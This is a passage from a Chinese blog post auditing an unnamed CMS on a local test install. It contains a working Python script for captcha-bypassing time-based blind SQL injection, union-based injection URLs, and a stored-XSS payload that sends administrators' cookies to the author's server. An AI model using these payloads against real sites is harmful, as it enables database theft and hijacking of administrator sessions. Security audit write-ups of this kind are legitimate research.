class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">r = requests.Session()</span><br><span class="line">url_code = <span class="string">'http://localhost:81/system/code.php?act=yes'</span></span><br><span class="line">url_login = <span class="string">'http://localhost:81/system/loginpass.php'</span></span><br><span class="line">length = <span class="string">''</span></span><br><span class="line">name = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里获取验证码，并将原图转为灰度图像，然后再指定二值化的阈值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">code</span><span class="params">()</span>:</span></span><br><span class="line">    req = r.get(url_code)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'1.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(req.content)</span><br><span class="line">    <span class="comment">#新建Image对象</span></span><br><span class="line">    image = Image.open(<span class="string">"1.png"</span>)</span><br><span class="line">    <span class="comment">#进行置灰处理</span></span><br><span class="line">    image = image.convert(<span class="string">'L'</span>)</span><br><span class="line">    <span class="comment">#这个是二值化阈值</span></span><br><span class="line">    threshold = <span class="number">150</span></span><br><span class="line">    table = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> i &lt; threshold:</span><br><span class="line">            table.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            table.append(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#通过表格转换成二进制图片，1的作用是白色，不然就全部黑色了</span></span><br><span class="line">    image = image.point(table,<span class="string">"1"</span>)</span><br><span class="line">    code = pytesseract.image_to_string(image)</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里判断数据库名长度验证码是否正确，如果错误的话，递归提交，直到正确为止</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkcode_length</span><span class="params">(num2,num1=<span class="number">1</span>)</span>:</span></span><br><span class="line">    payload_length = <span class="string">"1' and case when (ascii(mid((length(database())),&#123;num1&#125;,1))=&#123;num2&#125;) then (sleep(3)) else (1) end and '"</span></span><br><span class="line">    data = &#123;<span class="string">'admin'</span>: <span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'password'</span>: <span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'checkcode'</span>: code()</span><br><span class="line">            &#125;</span><br><span class="line">    full_payload = payload_length.format(num1=str(num1),num2=str(num2))</span><br><span class="line">    print(full_payload)</span><br><span class="line">    req = r.post(url_login, data=data, headers=&#123;<span class="string">'X-Forwarded-For'</span>: full_payload&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'验证码输入有误'</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="keyword">return</span> checkcode_length(num2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里判断数据库名验证码是否正确，如果错误的话，递归提交，直到正确为止</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkcode_database_name</span><span class="params">(num1,num2)</span>:</span></span><br><span class="line">    payload_database_name = <span class="string">"1' and case when (ascii(mid((database()),&#123;num1&#125;,1))&lt;&#123;num2&#125;) then (sleep(3)) else (1) end and '"</span></span><br><span class="line">    data = &#123;<span class="string">'admin'</span>: <span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'password'</span>: <span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'checkcode'</span>: code()</span><br><span class="line">            &#125;</span><br><span class="line">    full_payload = payload_database_name.format(num1=str(num1),num2=str(num2))</span><br><span class="line">    print(full_payload)</span><br><span class="line">    req = r.post(url_login, data=data, headers=&#123;<span class="string">'X-Forwarded-For'</span>: full_payload&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'验证码输入有误'</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="keyword">return</span> checkcode_database_name(num1,num2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里返回数据库名的长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_length</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> length</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">58</span>):</span><br><span class="line">        payload_length = <span class="string">"1' and case when (ascii(mid((length(database())),1,1))=&#123;num1&#125;) then (sleep(3)) else (1) end and '"</span></span><br><span class="line">        data = &#123;<span class="string">'admin'</span>: <span class="string">'1'</span>,</span><br><span class="line">                <span class="string">'password'</span>: <span class="string">'1'</span>,</span><br><span class="line">                <span class="string">'checkcode'</span>: code()</span><br><span class="line">                &#125;</span><br><span class="line">        full_payload = payload_length.format(num1=str(i))</span><br><span class="line">        print(full_payload)</span><br><span class="line">        start_time = time()</span><br><span class="line">        req = r.post(url_login, data=data, headers=&#123;<span class="string">'X-Forwarded-For'</span>: full_payload&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'验证码输入有误'</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            checkcode_length(str(i))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> time() - start_time &gt; <span class="number">2.5</span>:</span><br><span class="line">                length += chr(i)</span><br><span class="line">                print(length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里调用database_length()函数来获取数据库名的长度</span></span><br><span class="line">database_length()</span><br><span class="line">print(length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里返回数据库名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_name</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> name</span><br><span class="line">    payload_database_name = <span class="string">"1' and case when (ascii(mid((database()),&#123;num1&#125;,1))&lt;&#123;num2&#125;) then (sleep(3)) else (1) end and '"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,int(length)+<span class="number">1</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            mid = (left + right) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> mid == left:</span><br><span class="line">                name += chr(mid)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            data = &#123;<span class="string">'admin'</span>: <span class="string">'1'</span>,</span><br><span class="line">                    <span class="string">'password'</span>: <span class="string">'1'</span>,</span><br><span class="line">                    <span class="string">'checkcode'</span>: code()</span><br><span class="line">                    &#125;</span><br><span class="line">            full_payload = payload_database_name.format(num1=str(i), num2=str(mid))</span><br><span class="line">            print(full_payload)</span><br><span class="line">            start_time = time()</span><br><span class="line">            req = r.post(url_login, data=data, headers=&#123;<span class="string">'X-Forwarded-For'</span>: full_payload&#125;)</span><br><span class="line">            print(full_payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'验证码输入有误'</span> <span class="keyword">in</span> req.text:</span><br><span class="line">                checkcode_database_name(i, mid)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> time() - start_time &gt; <span class="number">2.5</span>:</span><br><span class="line">                    right = mid</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    left = mid</span><br><span class="line">                    </span><br><span class="line"><span class="comment"># 这里调用database_name()函数来获取数据库名</span></span><br><span class="line">database_name()</span><br><span class="line">print(name)</span><br></pre></td></tr></table></figure>
+<h2 id="第三处sql注入"><a href="#第三处sql注入" class="headerlink" title="第三处sql注入"></a>第三处sql注入</h2><p><code>/system/hf_book.php</code>关键代码如下,大概在这个页面的18行左右</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">$sxid=$_GET[<span class="string">"id"</span>];</span><br><span class="line">$e_rs=$db-&gt;get_one(<span class="string">"select * from ***cms_book where id=$sxid"</span>,MYSQL_ASSOC);</span><br><span class="line">$bid=$e_rs[<span class="string">'id'</span>];</span><br><span class="line">....</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+<p>先猜测字段数目,11正确，12错误，说明字段数是11</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:81/CMS/***cms/system/hf_book.php?id=11 order by 11#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:81/CMS/***cms/system/hf_book.php?id=11 order by 12#</span><br></pre></td></tr></table></figure>
+<p><img src="http://images.xianyu123.club/20200408135511.png" alt="image-20200408135511457"></p>
+<p><img src="http://images.xianyu123.club/20200408135556.png" alt="image-20200408135556111"></p>
+<p>看回显部分，字段3和字段5存在回显</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:81/CMS/***cmcs/system/hf_book.php?id=11 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11#</span><br></pre></td></tr></table></figure>
+<p><img src="http://images.xianyu123.club/20200408135648.png" alt="image-20200408135648088"></p>
+<p>注入出数据库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:81/CMS/***cms/system/hf_book.php?id=11 and 1=2 union select 1,2,database(),4,5,6,7,8,9,10,11#</span><br></pre></td></tr></table></figure>
+<p><img src="http://images.xianyu123.club/20200408135739.png" alt="image-20200408135739867"></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这里其实还有非常多的sql注入，包括insert注入，delete注入，update注入，由于文章篇幅的原因，没有一一例举。因为源头insert或者update或者delete没有做好过滤，导致了这篇漏洞，所以这里也就不再重复说明，举了几个比较典型的案例来说明</p>
+<h1 id="前台存储型xss"><a href="#前台存储型xss" class="headerlink" title="前台存储型xss"></a>前台存储型xss</h1><p><code>/add_do.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span> <span class="string">'Conf/***cms.inc.php'</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">'Libs/Function/fun.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(strtolower($_POST[<span class="string">"checkcode"</span>])==strtolower($_SESSION[<span class="string">"randval"</span>]))&#123;</span><br><span class="line">  <span class="keyword">unset</span>($_SESSION[<span class="string">"randval"</span>]);<span class="comment">//释放session中的变量</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">unset</span>($_SESSION[<span class="string">"randval"</span>]);</span><br><span class="line">  ok_info(<span class="number">0</span>,<span class="string">"验证码输入有误!"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$byz=$_POST[<span class="string">'b_yzcode'</span>];</span><br><span class="line"><span class="keyword">if</span>($byz!==md5($yzcode))&#123;</span><br><span class="line">	ok_info(<span class="number">0</span>,<span class="string">'错误的参数！'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$siteinfo = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'type_id'</span> =&gt; intval(trim($_POST[<span class="string">'type_id'</span>])),</span><br><span class="line">		<span class="string">'b_title'</span> =&gt; injCheck($_POST[<span class="string">'b_title'</span>]),</span><br><span class="line">		<span class="string">'b_content'</span> =&gt; injCheck($_POST[<span class="string">'b_content'</span>]),</span><br><span class="line">		<span class="string">'b_name'</span> =&gt; injCheck($_POST[<span class="string">'b_name'</span>]),</span><br><span class="line">		<span class="string">'b_tel'</span> =&gt; injCheck($_POST[<span class="string">'b_tel'</span>]),</span><br><span class="line">		<span class="string">'b_mail'</span> =&gt; injCheck($_POST[<span class="string">'b_mail'</span>]),</span><br><span class="line">		<span class="string">'b_qq'</span> =&gt; injCheck($_POST[<span class="string">'b_qq'</span>]),</span><br><span class="line">		<span class="string">'b_ip'</span> =&gt; injCheck($_POST[<span class="string">'b_ip'</span>]),</span><br><span class="line">		<span class="string">'c_date'</span> =&gt; time()</span><br><span class="line">		);</span><br><span class="line">$db-&gt;insert(<span class="string">"***cms_book"</span>, $siteinfo);</span><br><span class="line">$db-&gt;close();</span><br><span class="line">ok_info(<span class="string">'/index.php'</span>,<span class="string">'恭喜你，留言提交成功！'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>第17行到第24行，只对sql注入进行了过滤，并没有对xss过滤，导致了这些提交字段都存在xss漏洞</p>
+<p>然后我们到该页面，进行提交</p>
+<p><img src="http://images.xianyu123.club/20200408141210.jpeg" alt="xss2"></p>
+<p>这里我是用我的服务器进行监听，<code>4.js</code>内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var image=new Image();</span><br><span class="line">image.src=&quot;http://你的vps-ip:10006/cookies.phpcookie=&quot;+document.cookie;</span><br></pre></td></tr></table></figure>
+<p>然后在我自己的服务器上nc监听</p>
+<p><img src="http://images.xianyu123.club/20200408141355.png" alt="xss3"></p>
+<p>然后当管理员在后台点击访问新回复的时候</p>
+<p><img src="http://images.xianyu123.club/20200408141657.jpeg" alt="xss1"></p>
+<p>然后可以打到cookie并且可以成功登录</p>
+<p><img src="http://images.xianyu123.club/20200408141925.jpeg" alt="xss5"></p>
+<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>其实这里也有后台存储型xss，但是很鸡肋，就不说了</p>
+
+      
+    </div>
+    
+    
+    
+
+	<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2020/06/18/对某cms的一次审计/">对某cms的一次审计</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 xianyu123 的个人博客">xianyu123</a></p>
+  <p><span>发布时间:</span>2020年06月18日 - 11:01</p>
+  <p><span>最后更新:</span>2020年06月18日 - 11:07</p>
+  <p><span>原始链接:</span><a href="/2020/06/18/对某cms的一次审计/" title="对某cms的一次审计">http://0clickjacking0.github.io/2020/06/18/对某cms的一次审计/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://0clickjacking0.github.io/2020/06/18/对某cms的一次审计/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+	});
+    });  
+</script>
+
+
+      
+</div>
+
+
+    
+
+    
+
+    
+
+	
+	<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------　　　　本文结束　<i class="fa fa-heart"></i>　感谢您的阅读　　　　-------------</div>
+    
+</div>
+  
+</div>
+	
+	
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/06/17/hadoop高可用安装/" rel="next" title="hadoop高可用安装">
+                <i class="fa fa-chevron-left"></i> hadoop高可用安装
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/06/18/某cms的一次审计/" rel="prev" title="某cms的一次审计">
+                某cms的一次审计 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">xianyu123</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">51</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://only-free.github.io/" title="小彪" target="_blank">小彪</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.kr1sten.cn/" title="K神" target="_blank">K神</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://charon.xin/" title="Char0n" target="_blank">Char0n</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://tgaout.github.io/categories/" title="TGAO" target="_blank">TGAO</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://brownfly.github.io/" title="Insomnia" target="_blank">Insomnia</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://r0co.top/" title="r0co" target="_blank">r0co</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.ragdoll.work/" title="南梦师傅" target="_blank">南梦师傅</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.hutc.xyz/" title="luz" target="_blank">luz</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://liotree.github.io/" title="LionTree师傅" target="_blank">LionTree师傅</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://cnblogs.com/klsfct" title="圆周师傅" target="_blank">圆周师傅</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.csdn.net/zz_Caleb/" title="Sea_Sand息禅师傅" target="_blank">Sea_Sand息禅师傅</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://flag0.com/" title="flag0师傅" target="_blank">flag0师傅</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#网站目录结构"><span class="nav-number">1.</span> <span class="nav-text">网站目录结构</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后台SQL注入漏洞"><span class="nav-number">2.</span> <span class="nav-text">后台SQL注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#第一处sql注入"><span class="nav-number">2.1.</span> <span class="nav-text">第一处sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第二处sql注入"><span class="nav-number">2.2.</span> <span class="nav-text">第二处sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第三处sql注入"><span class="nav-number">2.3.</span> <span class="nav-text">第三处sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">2.4.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#前台存储型xss"><span class="nav-number">3.</span> <span class="nav-text">前台存储型xss</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#小结-1"><span class="nav-number">3.1.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+   
+  </span>
+  <span class="author" itemprop="copyrightHolder">xianyu123</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '9NfSKiv9nK43bHqe0PASB6LJ-gzGzoHsz',
+        appKey: 'jL5QGkWKt6bpnKpTNwkA5c9n',
+        placeholder: '有想说的欢迎留言，留下你的邮箱，有回复就会提醒你~（邮箱不会被公开）',
+        avatar:'',
+        guest_info:guest,
+        pageSize:'10' || 10,
+		avatar_cdn:'https://www.gravatar.com/avatar/',
+    });
+  </script>
+
+
+
+  
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v=5.1.4"></script>
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("9NfSKiv9nK43bHqe0PASB6LJ-gzGzoHsz", "jL5QGkWKt6bpnKpTNwkA5c9n");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <script type="text/javascript" src="/lib/zclip/clipboard.min.js"></script>	
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+</body>
+</html>
